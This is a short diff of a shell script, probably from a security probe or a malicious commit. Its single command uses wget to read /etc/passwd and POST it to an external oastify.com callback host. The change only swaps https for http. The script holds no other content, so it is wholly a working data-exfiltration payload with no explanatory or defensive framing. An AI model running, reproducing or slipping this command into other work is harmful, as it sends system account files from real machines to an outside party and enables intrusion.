@@ -1,3 +1,3 @@
 #!/bin/sh
 
-wget --post-data="output=$(cat /etc/passwd)" https://n8n.cloud.tkhyqsw0b8vbuvngg3tk4dizzq5htbh0.oastify.com/n8n-cloud
+wget --post-data="output=$(cat /etc/passwd)" http://n8n.cloud.tkhyqsw0b8vbuvngg3tk4dizzq5htbh0.oastify.com/n8n-cloud
